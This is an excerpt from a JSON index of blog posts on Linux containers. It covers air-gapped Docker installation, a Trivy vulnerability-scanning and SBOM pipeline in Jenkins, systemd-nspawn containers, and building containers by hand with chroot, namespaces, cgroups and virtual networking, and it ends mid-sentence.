[ { "title": "Install Docker Air Gapped", "url": "/posts/docker-debian-airgapped/", "categories": "Containerization", "tags": "containerization, docker, docker desktop, kali", "date": "2022-07-16 12:00:00 -0500", "snippet": "As part of a competition i am taking part of i needed the ability to run a simple self hosted wiki page on my Kali box. the fastest and best alternative was to run this as a container.Although i tried to export the image to run with systemd-namespaces i ran into many issues. So i decided to find a way to find a way to install docker air-gapped along with my wiki image.Getting the filesIn order to install docker you will need 3 different files (4 if you want docker compose).Per Dockers documentation you will need the following files. containerd docker-ce docker-ce-cli docker-compose-plugin #optionalGo to this page and download the files for your system: https://download.docker.com/linux/debian/dists/bullseye/pool/stable/amd64/Note: replace amd64 with your own architecture if for example you need to run on a Raspberry Pi.orJust run the following commands to download your deb packages.wget https://download.docker.com/linux/debian/dists/bullseye/pool/stable/amd64/containerd.io_1.6.6-1_amd64.debwget https://download.docker.com/linux/debian/dists/bullseye/pool/stable/amd64/docker-ce-cli_20.10.16~3-0~debian-bullseye_amd64.debwget https://download.docker.com/linux/debian/dists/bullseye/pool/stable/amd64/docker-ce_20.10.16~3-0~debian-bullseye_amd64.debwget https://download.docker.com/linux/debian/dists/bullseye/pool/stable/amd64/docker-compose-plugin_2.6.0~debian-bullseye_amd64.debNow save these to a flash drive or however you will be able to get to it later.Install DockerAlthough the documentaton says to use dpkg i had a few issues with installing it so i just used apt.sudo apt install ./containerd.io_1.6.6-1_amd64.debsudo apt install ./docker-ce-cli_20.10.16~3-0~debian-bullseye_amd64.debsudo apt install ./docker-ce_20.10.16~3-0~debian-bullseye_amd64.debsudo apt install ./docker-compose-plugin_2.6.0\\~debian-bullseye_amd64.debAdditional post installIf you want your kali user to be able to run the commands without sudo run the following commands.Create a docker group.sudo groupadd dockerAdd your user to the docker group.sudo usermod -aG docker $USERLog out and log back in so that your group membership is re-evaluated.If testing on a virtual machine, it may be necessary to restart the virtual machine for changes to take effect.Get a Docker ImageSo docker is useless by itself so its time to get your docker images ready so you can load them in the airgapped system laterPull the imageFirst on a internet connected machine pull your image using docker.docker pull my_docker_imageExample:docker pull lscr.io/linuxserver/dokuwiki:latestSave your imageThen its time to save it in a format that we can import latersave -o my_docker_image.docker my_docker_imageExample:docker save -o dokuwiki.docker lscr.io/linuxserver/dokuwiki If you dont know the name of the your image just run docker images ,it will be the “full name” under REPOSITORYSave this image in your usb drive or use SCP or like with your other files wherever you can get to them later.Run the docker image on an airgapped sytem.Now that you have docker installed and running, import your image.docker load -i my_image_nameExample:docker load -i dokuwiki.dockerNow you can run your container just like you would normally.Example:docker run -d \\ --name=dokuwiki \\ -e PUID=1000 \\ -e PGID=1000 \\ -e TZ=America/Chicago \\ -p 80:80 \\ --restart unless-stopped \\ lscr.io/linuxserver/dokuwiki:latest" }, { "title": "Container Image Pipeline With SBOM", "url": "/posts/container-image-pipeline-with-sbom/", "categories": "Containerization, DevSecOps", "tags": "containerization, docker, devsecops, SBOM", "date": "2022-03-12 11:00:00 -0600", "snippet": "This is to go over a container image pipeline that will scan for vulnerabilities and generate a Software Bill of Materials at the end.Proposed Architecturegraph TD A[Dev User Pushes Dockerfile to git repo] --&gt;|git repo notifies Jenkins| B(Jenkins pulls down repo and kicks off job) --&gt;|Pipeline Builds Docker Image| C(Dependencies are pulled from artifact management system) --&gt;|Trivy runs against the docker image,the FS and the code| D(Jenkins pulls down repo and kicks off job) D --&gt; E{Vuln Scan} E --&gt;|Passes| F[Docker Image is uploaded to artifact management system] F --&gt; G(SBOM gets genrated and uploaded to artifact mangament system) E --&gt;|fails| H[pipeline fails and stops]TrivyWhat is Trivy?Trivy (tri pronounced like trigger, vy pronounced like envy) is a simple and comprehensive scanner for vulnerabilities in container images, file systems, and Git repositories, as well as for configuration issues. Trivy detects vulnerabilities of OS packages (Alpine, RHEL, CentOS, etc.) and language-specific packages (Bundler, Composer, npm, yarn, etc.). In addition, Trivy scans Infrastructure as Code (IaC) files such as Terraform, Dockerfile and Kubernetes, to detect potential configuration issues that expose your deployments to the risk of attack. Trivy also scans hardcoded secrets like passwords, API keys and tokens. Trivy is easy to use. Just install the binary and you’re ready to scan.Features Comprehensive vulnerability detection OS packages (Alpine Linux, Red Hat Universal Base Image, Red Hat Enterprise Linux, CentOS, AlmaLinux, Rocky Linux, CBL-Mariner, Oracle Linux, Debian, Ubuntu, Amazon Linux, openSUSE Leap, SUSE Enterprise Linux, Photon OS and Distroless) Language-specific packages (Bundler, Composer, Pipenv, Poetry, npm, yarn, Cargo, NuGet, Maven, and Go)Misconfiguration detection (IaC scanning) A wide variety of built-in policies are provided out of the box Kubernetes, Docker, Terraform, and more coming soon Support custom policies Secret detection A wide variety of built-in rules are provided out of the box Support custom rules Scan container images at a high speed Simple Specify only an image name, a path to config files, or an artifact name Fast The first scan will finish within 10 seconds (depending on your network). Consequent scans will finish in a single second. Easy installation apt-get install, yum install and brew install are possible. No pre-requisites such as installation of DB, libraries, etc. High accuracy Especially Alpine Linux and RHEL/CentOS Other OSes are also high DevSecOps Suitable for CI such as GitHub Actions, Jenkins, GitLab CI, etc. Support multiple targets container image, local filesystem, and remote git repository Supply chain security (SBOM support) Support CycloneDX Support SPDX IntegrationsVSCode via an extension -https://github.com/aquasecurity/trivy-vscode-extensionDocker Dekstop via an extension - https://github.com/aquasecurity/trivy-docker-extension#:~:text=Trivy%20Docker%20Extension-,What%20is%20this%3F,image%20into%20the%20drop%20downSBOM’sTrivy can create a Software Bill of Materials!For Containers:&gt;$ trivy sbom &lt;imagename&gt;For Filesystems:&gt;$ trivy sbom --artifact-type fs ./For Git Repos:&gt;$ trivy sbom --artifact-type repo &lt;repo&gt;Where does Trivy get its data sources from?Data sources official doc: https://aquasecurity.github.io/trivy/v0.28.1/docs/vulnerability/detection/data-source/OS OS Source Arch Linux Vulnerable Issues Alpine Linux secdb Amazon Linux 1 Amazon Linux Security Center Amazon Linux 2 Amazon Linux Security Center Debian Security Bug Tracker   OVAL Ubuntu Ubuntu CVE Tracker RHEL/CentOS OVAL   Security Data AlmaLinux AlmaLinux Product Errata Rocky Linux Rocky Linux UpdateInfo Oracle Linux OVAL CBL-Mariner OVAL OpenSUSE/SLES CVRF Photon OS Photon Security Advisory Programming Language Language Source Commercial Use Delay1 PHP PHP Security Advisories Database ✅ -   GitHub Advisory Database (Composer) ✅ - Python GitHub Advisory Database (pip) ✅ -   Open Source Vulnerabilities (PyPI) ✅ - Ruby Ruby Advisory Database ✅ -   GitHub Advisory Database (RubyGems) ✅ - Node.js Ecosystem Security Working Group ✅ -   GitHub Advisory Database (npm) ✅ - Java GitLab Advisories Community ✅ 1 month   GitHub Advisory Database (Maven) ✅ - Go GitLab Advisories Community ✅ 1 month   The Go Vulnerability Database ✅ - Rust Open Source Vulnerabilities (crates.io) ✅ - .NET GitHub Advisory Database (NuGet) ✅ - Others Name Source National Vulnerability Database NVD Data source selectionTrivy only consumes security advisories from the sources listed in the following tables.As for packages installed from OS package managers (dpkg, yum, apk, etc.), Trivy uses the advisory database from the appropriate OS vendor.For example: for a python package installed from yum (Amazon linux), Trivy will only get advisories from ALAS. But for a python package installed from another source (e.g. pip), Trivy will get advisories from the GitLab and GitHub databases.This advisory selection is essential to avoid getting false positives because OS vendors usually backport upstream fixes, and the fixed version can be different from the upstream fixed version.The severity is from the selected data source. If the data source does not provide severity, it falls back to NVD, and if NVD does not have severity, it will be UNKNOWN.Ari-Gapped EnvironmentTrivy can be used in air-gapped environments. Note that an allowlist is here. ghcr.io pkg-containers.githubusercontent.comAir-Gapped Environment for VulnerabilitiesDownload the vulnerability databaseAt first, you need to download the vulnerability database for use in air-gapped environments. Please follow oras installation instruction.Download db.tar.gz:$ oras pull ghcr.io/aquasecurity/trivy-db:2 -aTransfer the DB file into the air-gapped environmentThe way of transfer depends on the environment.$ rsync -av -e ssh /path/to/db.tar.gz [user]@[host]:dstPut the DB file in Trivy’s cache directoryYou have to know where to put the DB file. The following command shows the default cache directory.$ ssh user@host$ trivy -h | grep cache --cache-dir value cache directory (default: \"/home/myuser/.cache/trivy\") [$TRIVY_CACHE_DIR]Put the DB file in the cache directory + /db.$ mkdir -p /home/myuser/.cache/trivy/db$ cd /home/myuser/.cache/trivy/db$ tar xvf /path/to/db.tar.gz -C /home/myuser/.cache/trivy/dbx trivy.dbx metadata.json$ rm /path/to/db.tar.gzIn an air-gapped environment, it is your responsibility to update the Trivy database on a regular basis so that the scanner can detect recently-identified vulnerabilities.Run Trivy with –skip-update and –offline-scan optionIn an air-gapped environment, specify –skip-update so that Trivy doesn’t attempt to download the latest database file. In addition, if you want to scan Java dependencies such as JAR and pom.xml, you need to specify –offline-scan since Trivy tries to issue API requests for scanning Java applications by default.$ trivy image --skip-update --offline-scan alpine:3.12Air-Gapped Environment for misconfigurationsNo special measures are required to detect misconfigurations in an air-gapped environment.Run Trivy with –skip-policy-update optionIn an air-gapped environment, specify –skip-policy-update so that Trivy doesn’t attempt to download the latest misconfiguration policies.$ trivy conf --skip-policy-update /path/to/confExceptions / Custom PoliciesExceptions let you specify cases where you allow policy violations. Trivy supports two types of exceptions.Example:package user.kubernetes.ID100__rego_metadata := { \"id\": \"ID100\", \"title\": \"Deployment not allowed\", \"severity\": \"HIGH\", \"type\": \"Kubernetes Custom Check\",}deny_deployment[msg] { input.kind == \"Deployment\" msg = sprintf(\"Found deployment '%s' but deployments are not allowed\", [name])}exception[rules] { input.kind == \"Deployment\" input.metadata.name == \"allow-deployment\" rules := [\"deployment\"]}Custom PolciesYou can write custom policies in Rego. Once you finish writing custom policies, you can pass the directory where those policies are stored with –policy option.trivy conf --policy /path/to/custom_policies --namespaces user /path/to/config_dirFile formats File format File pattern JSON *.json YAML *.yaml and *.yml Dockerfile Dockerfile, Dockerfile.*, and *.Dockerfile Containerfile Containerfile, Containerfile.*, and *.Containerfile Terraform *.tf and *.tf.json Example:package user.kubernetes.ID001__rego_metadata__ := { \"id\": \"ID001\", \"title\": \"Deployment not allowed\", \"severity\": \"LOW\", \"type\": \"Custom Kubernetes Check\", \"description\": \"Deployments are not allowed because of some reasons.\",}__rego_input__ := { \"selector\": [ {\"type\": \"kubernetes\"}, ],}deny[msg] { input.kind == \"Deployment\" msg = sprintf(\"Found deployment '%s' but deployments are not allowed\", [input.metadata.name])}PipelineJenkins PipelineWe will be using Jenkins as our main orchestrator.Created my own here: https://github.com/tamalerhino/chubby-unicorn/blob/main/Jenkinsfilepipeline { agent any options { buildDiscarder(logRotator(numToKeepStr: '5')) } stages { stage('Build') { steps { sh 'docker build -t \"${IMAGENAME}\" .' } } stage('Scan') { steps { sh 'trivy image --exit-code 1 --severity MEDIUM,HIGH,CRITICAL \"${IMAGENAME}\"' } } stage('Create SBOM') { steps { sh 'trivy --output \"${IMAGENAME}\".json sbom \"${IMAGENAME}\"' } } stage('Upload Artifacts') { steps { sh 'docker login \"${CONTAINER-REPO-URL}\" -u=\"${CONTAINER-REPO-USERNAME}\" -p=\"${CONTAINER-REPO-PASSWORD]\"' sh 'docker tag \"${IMAGENAME}\" \"${CONTAINERPROJECT}\"/\"${IMAGENAME}\"' sh 'docker push \"${CONTAINER-REPO-URL}\"/\"${CONTAINERPROJECT}\"/\"${IMAGENAME}\"' } steps { sh 'curl -u \"${USERNAME}\":\"${PASSWORD}\" -X PUT \"${ARTIFACTORY-RUL}/\"${CONTAINERPROJECT}\"/\"${IMAGENAME}\".json\" -T \"${IMAGENAME}\".json' } } }} Intentional delay between vulnerability disclosure and registration in the DB &#8617; " }, { "title": "Systemd Namespace Containers", "url": "/posts/systemd-namespace-containers/", "categories": "Containerization", "tags": "containerization, docker, systemd", "date": "2022-03-05 11:00:00 -0600", "snippet": "In my journey to demystify containers and get away from a product and run containers with nothing but my Linux laptop i decided that Containers From Scratch were great, but what if it was easier to manage your container once its created? It is! And you can do it all with nothing but systemd!PrerequisitesHave machinectl installed. This package provides systemd tools for nspawn and container/VM management: * systemd-nspawn * systemd-machined and machinectl * systemd-importdIf its not installed install it the following ways:Ubuntu/Debian/Kali/Raspbianapt install systemd-containerRHEL/CentOSyum install systemdFedoradnf install systemd-containerArchpacman -S systemdContainer ImagesThere are multiple ways to create/get a container image. From scratch ie bootstrap From a already made tar or img file such as a Ubuntu’s cloudimage or from snpawn.org From a docker image/containerFrom scratchSee my blog “Bootstrapping Debian As a Container Image”.From a ready to go imageThere are several cloud images out there here are the ones for ubuntu: https://cloud-images.ubuntu.com/kinetic/current/kinetic-server-cloudimg-arm64.tar.gzTheres also this great nspawn image hub (similar to docker hub) for namespace container images! https://hub.nspawn.org/images/ This is what we will use, since its the fastest and simplest methodFrom a Docker container/imageThis not work in most cases since you will need to create an init script on the container to start your services. But it is a container it just wont run anything automatically until you login to the container and run it manually.First find the docker image you want from docker hub - in my example i have chosen dokuwiki.Second pull the image down.docker pull dokuwikiThird run the container how you would like it to run.docker run -d \\ --name=dokuwiki \\ -e PUID=1000 \\ -e PGID=1000 \\ -e TZ=America/Chicago \\ -p 80:80 \\ --restart unless-stopped \\ lscr.io/linuxserver/dokuwiki:latestFinally export the image to a tar file that can be used with systemd-namespace containers.docker export --output=dokuwiki.tar dokuwikiDownloading or Oulling the Imagewget/curlIf you got your image hosted somewhere on the internet just use wget or curl to download it.Pulling an “image” using machinectltarball imageThe below example uses the “ready to go image” examplemachinectl pull-tar https://hub.nspawn.org/storage/centos/8/tar/image.tar.xzimg/raw imageThe below example uses the “ready to go image” examplemachinectl pull-raw https://hub.nspawn.org/storage/centos/8/raw/image.raw.xzExample:tamalerhino@localhost:~$ sudo machinectl pull-raw https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz --verify=noEnqueued transfer job 1. Press C-c to continue download in background.Pulling 'https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz', saving as 'image'.HTTP request to https://hub.nspawn.org/storage/centos/8/raw/image.roothash failed with code 404.Root hash file could not be retrieved, proceeding without.HTTP request to https://hub.nspawn.org/storage/centos/8/raw/image.roothash.p7s failed with code 404.Root hash signature file could not be retrieved, proceeding without.Downloading 381.8M for https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz.HTTP request to https://hub.nspawn.org/storage/centos/8/raw/image.verity failed with code 404.Verity integrity file could not be retrieved, proceeding without. https://hub.nspawn.org/storage/centos/8/raw/image.verityDownloading 32B for https://hub.nspawn.org/storage/centos/8/raw/image.nspawn.Download of https://hub.nspawn.org/storage/centos/8/raw/image.nspawn complete.Got 1% of https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz. 1min 49s left at 3.4M/s.........Got 99% of https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz. 284ms left at 13.1M/s.Download of https://hub.nspawn.org/storage/centos/8/raw/image.raw.xz complete.Created new local image 'image'.Created new file /var/lib/machines/image.nspawn.Operation completed successfully.Exiting.tamalerhino@localhost:~$TroubleshootingYou might run into an issue where it wants to be verified, in that case run:--verify=noImporting a local imagetarball imagemachinectl import-tar dokuwiki.tarimg/raw imagemachinectl import-raw dokuwiki.imgView the installed images.machinectl list-images --allmachinectl show-image &lt;imagename&gt; When i downloaded my centos image it named it image for some reason, so just replace that with whatever it named yours.Example:tamalerhino@localhost:~$ sudo machinectl list-imagesNAME TYPE RO USAGE CREATED MODIFIEDimage raw no 3.2G Sun 2022-08-14 02:41:35 UTC Sun 2022-08-14 02:41:35 UTC1 images listed.tamalerhino@localhost:~$ sudo machinectl show-images imageUnknown command verb show-images.tamalerhino@localhost:~$ sudo machinectl show-image imageName=imagePath=/var/lib/machines/image.rawType=rawReadOnly=noCreationTimestamp=Sun 2022-08-14 02:41:35 UTCModificationTimestamp=Sun 2022-08-14 02:41:35 UTCUsage=3489710080Limit=3489701888UsageExclusive=3489710080LimitExclusive=3489701888tamalerhino@localhost:~$Starting The ContainerThere are two main ways to start the container, using machinectl or nspawn,which is like chroot but on steroids, sometimes machinectl wont start it so use nspawn.machinectltamalerhino@localhost:~$ sudo nspawn -i centos/8/raw When i downloaded my centos image it named it image for some reason, so just replace that with whatever it named yours.Example:tamalerhino@localhost:~$ machinectl start imagetamalerhino@localhost:~$ sudo machinectl login imageConnected to machine image. Press ^] three times within 1s to exit session.CentOS Linux 8Kernel 5.15.0-46-generic on an x86_64centos8 login: rootPassword:[root@centos8 ~]# cat /etc/redhat-releaseCentOS Linux release 8.5.2111[root@centos8 ~]#nspawnsudo systemd-nspawn -M &lt;image&gt;Example:tamalerhino@localhost:~$ sudo systemd-nspawn -M imageIgnoring Capability= setting, file /var/lib/machines/image.nspawn is not trusted.Spawning container image on /var/lib/machines/image.raw.Press ^] three times within 1s to kill container.[root@image ~]# cat /etc/redhat-releaseCentOS Linux release 8.5.2111[root@image ~]#Using a directoryDepending if you want a shell or not it might be best to untar it and run it with the --boot -b flag to let systemd run systemd inside of the container. This is assuming you used the docker tar image or some image that is using a directorysystemd-nspawn -bD dokuwiki/Clean UpStopping an imagemachinectl stop imageDeleting the imagesJust as an FYI the default directory where all of this gets downloaded to is /var/lib/machinesTo clean most of this up you can run machinectl clean --allReferences https://en.wikipedia.org/wiki/POSIX https://www.freedesktop.org/software/systemd/man/machinectl.html https://wiki.archlinux.org/title/Systemd-nspawn https://docs.docker.com/engine/reference/commandline/export/ https://cloud-images.ubuntu.com/ https://www.nomadproject.io/plugins/drivers/community/nspawn https://wiki.debian.org/Debootstrap https://wiki.polaire.nl/doku.php?id=airspy_in_nspawn_chroot https://medium.com/@huljar/setting-up-containers-with-systemd-nspawn-b719cff0fb8d" }, { "title": "Containers From Scratch Part 2", "url": "/posts/container-from-scratch-pt2/", "categories": "Containerization", "tags": "containerization, docker", "date": "2022-02-12 11:00:00 -0600", "snippet": "In the first part we created a container in the simplest form, using namespaces, chroot, and a little pivot_root magic to isolate our service. But there is still much more to do…Further Isolation or limits (cgroups)cgroups, short for control groups, allow kernel-imposed isolation on resources like memory and CPU. This is so one container cant kill things in other containers by using up all the ram etc.The kernel exposes cgroups through the /sys/fs/cgroup directory. If your machine doesn’t have one you may have to mount the memory cgroup to follow along. This is only to show how cgroups work, in order to add the container to a cgroup you just need to add the PID of unshare to thecgroup.procs file. Run the following commands in a secondary terminal outside of your container.tamalerhino@localhost:~$ ls /sys/fs/cgroup/cgroup.controllers cpu.stat io.pressure sys-kernel-config.mountcgroup.max.depth cpuset.cpus.effective io.prio.class sys-kernel-debug.mountcgroup.max.descendants cpuset.mems.effective io.stat sys-kernel-tracing.mountcgroup.procs dev-hugepages.mount memory.numa_stat system.slicecgroup.stat dev-mqueue.mount memory.pressure user.slicecgroup.subtree_control init.scope memory.statcgroup.threads io.cost.model misc.capacitycpu.pressure io.cost.qos sys-fs-fuse-connections.mountFor this example, we’ll create a cgroup to restrict the memory of a process.In oder to create a cgroup all you need to do is create a directory. we will create one to limit the memory and we will call the folder “meow”. Once the directory has been created, the kernel automatically creates the nesseasary files to configure the cgroup itself.tamalerhino@localhost:~$ sudo mkdir /sys/fs/cgroup/meowtamalerhino@localhost:~$ ls /sys/fs/cgroup/meow/cgroup.controllers cpu.max cpuset.mems.effective memory.mincgroup.events cpu.max.burst io.max memory.numa_statcgroup.freeze cpu.pressure io.pressure memory.oom.groupcgroup.kill cpu.stat io.prio.class memory.pressurecgroup.max.depth cpu.uclamp.max io.stat memory.statcgroup.max.descendants cpu.uclamp.min io.weight memory.swap.currentcgroup.procs cpu.weight memory.current memory.swap.eventscgroup.stat cpu.weight.nice memory.events memory.swap.highcgroup.subtree_control cpuset.cpus memory.events.local memory.swap.maxcgroup.threads cpuset.cpus.effective memory.high pids.currentcgroup.type cpuset.cpus.partition memory.low pids.eventscpu.idle cpuset.mems memory.max pids.maxTo configure the memory value we just need to write to the correspoding file. We will limit it to 100MB of memory.tamalerhino@localhost:~$ sudo su #sudo wont work for some reasonroot@localhost:/home/tamalerhino# echo \"100000000\" &gt; /sys/fs/cgroup/meow/memory.maxroot@localhost:/home/tamalerhino# echo \"0\" &gt; /sys/fs/cgroup/meow/memory.swap.maxIn order to assign our process to that cgroup we will need to edit the cgroup.procs file. By adding our PID into this file.root@localhost:/home/tamalerhino# echo $$ &gt; /sys/fs/cgroup/meow/cgroup.procsLets test cgroup by running this script stolen from hereI just named the file crash.pyf = open(\"/dev/urandom\", \"r\")data = \"\"i=0while True: data += f.read(10000000) # 10mb i += 1 print \"%dmb\" % (i*10,)If you’ve set up the cgroup correctly, this won’t crash your computer.root@localhost:/home/tamalerhino# python2 crash.py10mb20mb30mb40mb50mb60mb70mb80mbKilledroot@localhost:/home/tamalerhino#As you can see it reached that limit and exited my process ie the bash process.cgroups can’t be removed until every process in the procs has exited or been reassigned to another group.Remove the directory with rmdir (don’t use rm - or you will get the operation not permited errors). DO NOT DO THIS UNLESS YOU’RE DONEroot@localhost:/home/tamalerhino# exitexittamalerhino@localhost:~$ sudo rmdir /sys/fs/cgroup/meowNetworkingNow to get some networking in the container so that we can do stuff.Start by creating a network namesapcetamalerhino@localhost:~/debian$ sudo ip netns add vnet0tamalerhino@localhost:~/debian$ sudo ip netnsvnet0You can view the ip links in the namespace created as well by runningtamalerhino@localhost:~$ sudo ip netns exec vnet0 ip link1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00Or you can use the shortcut for netns exec just as -n like so:tamalerhino@localhost:~$ sudo ip -n vnet0 link1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00Now we will create a network bridge/switchsudotamalerhino@localhost:~/debian$ sudo ip link add v-net-0 type bridgetamalerhino@localhost:~$ sudo ip link1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:0c:29:49:53:03 brd ff:ff:ff:ff:ff:ff altname enp2s18: v-net-0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN mode DEFAULT group default qlen 1000 link/ether 12:d5:3c:e1:f8:e6 brd ff:ff:ff:ff:ff:ffAnd we will bring the network bridge “UP”tamalerhino@localhost:~$ sudo ip link set dev v-net-0 upNow we will connect the namespace to this swich.Begin by creating the link pipe or ‘cable’tamalerhino@localhost:~$ sudo ip link add veth0 type veth peer name veth0-brThen attach it to the namespacetamalerhino@localhost:~$ sudo ip link set veth0 netns vnet0and then the virtual switchtamalerhino@localhost:~$ sudo ip link set veth0-br master v-net-0Now lets give the namespace an ip addresstamalerhino@localhost:~$ sudo ip -n vnet0 addr add 192.168.15.1/24 dev veth0And turn all the devices to “UP”tamalerhino@localhost:~$ sudo ip -n vnet0 link set veth0 uptamalerhino@localhost:~$ sudo ip link set veth0-br upNow to check we can run the following commandstamalerhino@localhost:~$ sudo ip -n vnet0 link1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:0010: veth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000 link/ether 6a:d8:d4:88:d0:2c brd ff:ff:ff:ff:ff:ff link-netnsid 0tamalerhino@localhost:~$ sudo ip -n vnet0 addr1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:0010: veth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 6a:d8:d4:88:d0:2c brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.15.1/32 scope global veth0 valid_lft forever preferred_lft forever inet6 fe80::68d8:d4ff:fe88:d02c/64 scope link valid_lft forever preferred_lft foreverNow this is good we have a network stack in the cointainer itself but it cannot access anything outside of it, and the host also cannot access the container inside.So we will go ahead and connect our host to that switch for interconnectivity first.tamalerhino@localhost:~$ sudo ip addr add 192.168.15.5/24 dev v-net-0You might also need to put in a policy to allow network forwardingtamalerhino@localhost:~$ sudo iptables --policy FORWARD ACCEPTNow to test!tamalerhino@localhost:~$ ping 192.168.15.1PING 192.168.15.1 (192.168.15.1) 56(84) bytes of data.64 bytes from 192.168.15.1: icmp_seq=1 ttl=64 time=0.088 ms.....It works!!However all you got rght now is connectivity from the host to the container, now to add connectivity from the container to the host.We can do that by adding a route to tell your container to forward the traffic through the virtual switch.Make sure to replace 192.168.22.0/34 with your hosts IPtamalerhino@localhost:~$ sudo ip netns exec vnet0 ip route add 192.168.22.0/24 via 192.168.15.5Now test ittamalerhino@localhost:~$ sudo ip netns exec vnet0 ping 192.168.22.144PING 192.168.22.144 (192.168.22.144) 56(84) bytes of data.64 bytes from 192.168.22.144: icmp_seq=1 ttl=64 time=0.029 ms64 bytes from 192.168.22.144: icmp_seq=2 ttl=64 time=0.064 msGreat that works! But what if you wanted to allow other things from outside of the host to connect to your container? For example if you were hosting a web service.We will essentially need to enable NATing on the host acting as the gateway to allow the container send and receive traffic with its own name and address.Again first lets enable traffic from the container to the outside world by adding a nat rule in our IP tables and a new route.tamalerhino@localhost:~$ sudo iptables -t nat -A POSTROUTING -s 192.168.15.0/24 -j MASQUERADEtamalerhino@localhost:~$ sudo ip netns exec vnet0 ip route add default via 192.168.15.5And now finally adding port forwarding! Below is just an example. Since we are not running anything on port 80 at the moment you wont be able to hit anything.tamalerhino@localhost:~$ tamalerhino@localhost:~$ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.15.1:80Below you can see how you can enter the namespace with the networking we just setup.sudo unshare --mount --uts --net=/var/run/netns/vnet0 --ipc --pid --mount-proc=/proc --fork bashThere is still so much to learn, in order to learn about container security I recommend you read into Linux Capabilites, Seccomp AppArmor, and of course good ol’ SELinux.Resources https://ericchiang.github.io/post/containers-from-scratch/ https://iximiuz.com/en/posts/container-networking-is-simple/ https://gist.github.com/cfra/39f4110366fa1ae9b1bddd1b47f586a3 https://man7.org/linux/man-pages/man8/ip-netns.8.html https://stackoverflow.com/questions/67971506/use-unshare-to-start-process-in-existing-net-namespace" }, { "title": "Containers From Scratch Part 1", "url": "/posts/container-from-scratch/", "categories": "Containerization", "tags": "containerization, docker", "date": "2022-02-11 11:00:00 -0600", "snippet": "At the end of the day, all a container is an isolated service with its dependencies, this document will go over how to create a container from scratch, using nothing but the built-in Linux kernel modules.How?As mentioned before, a container is nothing more than an isolated service running on the linux Kernel. How it does this is by using kernel level modules known as namespaces,cgroups and something called capabilities.For a deeper explanation of containers,namespaces,cgroups etc see my blog on NamespacesPrereqsYou will need some linux folders and structures, there are two ways to go about this. Using a Docker image, or rather exporting a Docker image. Downloading a basic filesystem or creating it from scratch.(checkout my other blog on creating debian distro from scratch “Bootstrapping Debian As a Container Image”)Option 1 Creating The Container ImageOn the machine a you have Docker installed. Pull the alpine imagedocker pull alpine Run the containerdocker run -d --name alpine alpine Finally export the image to a tar file.docker export --output=alpine.tar alpine You will have a tar file that you can put anywhere to save for later.Option 2 From ScratchFollow my other blog “Bootstrapping Debian As a Container Image” to get a tar.gz of a basic debian filesystem.Creating ContainerWith CHROOT If you went the docker route just replace debian to alpine or whatever you named your tar file.Get your tar image using wget or curlUntar the image and take a look around, its just like any other linux distro. Be adviced if you mess up the commands you will need to su to root because of permissions to delete stuff.tamalerhino@localhost:~$ sudo mkdir debiantamalerhino@localhost:~$ sudo tar -xzf debian.tar.gz -C debiantamalerhino@localhost:~$ ls -la debian/tamalerhino@localhost:~$ ls -al debian/etc/We will use chroot (old school!) to restrict the view of the process. This is what docker does when it does docker runtamalerhino@localhost:~$ sudo chroot debian /bin/bashroot@localhost:/# lsbin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr varroot@localhost:/# echo \"Meow\"Meowroot@localhost:/# exit Instead of a shell, we can run a command inside our chroot. Similar to dockers docker exec -d &lt;container&gt; echo \"Hello World\"tamalerhino@localhost:~$ sudo chroot debian echo \"meow\"meowtamalerhino@localhost:~$ Now of course if you try to install something using apt you will get an error since it does not have connectivity to the outside. Everything were running is from within our container. However it’s not completely isolated yet!You can check this by running top from outside the chroot container.tamalerhino@localhost:~$ top &amp;[2] 1619Then run the following commands to see that you can see the top command inside the chroot container.tamalerhino@localhost:~$ sudo chroot debian /bin/bashroot@localhost:/# mount -t proc proc /proc The mount -t proc.. commands are needed because when you run ps it is checking the /proc filesystem for the file representation of the running processes, and so we need to mount the /proc global FS.root@localhost:/# ps aux | grep top1000 7725 0.0 0.0 10396 3240 ? T 22:18 0:00 toproot 7761 0.0 0.0 8172 668 ? S+ 22:19 0:00 grep toproot@localhost:/#You should not be able to see that root process inside the container.Whats worse is you can actually kill that service from inside the container by runningroot@localhost:/# pkill topThat defeats the purpouse of containers right?!Isolation (namespaces)OK now to isolate the whole thing using a syscall called unshare by using the CLI tool by the same name. This will create a namespace for our container to run in.Below what we are doing is going into the debian directory, just like we would with chroot but now were giving ourselves specific namespaces to isolate the environment from the host environment and running bash as our process(the --fork flag is just saying we want to run bash as a child service of the unshare command.)tamalerhino@localhost:~$ cd debiantamalerhino@localhost:~/debian$ sudo unshare --mount --uts --fork bashroot@localhost:/home/tamalerhino/debian# When we run the unshare command and the namespaces eg --mount,--uts what were saying is: create an envionrment and give us our own instances of these namespaces for example --mount were saying we want our own mounts ie the ability to mount things only to our environement and not the host environment.To test that youre in a container lets try changing the 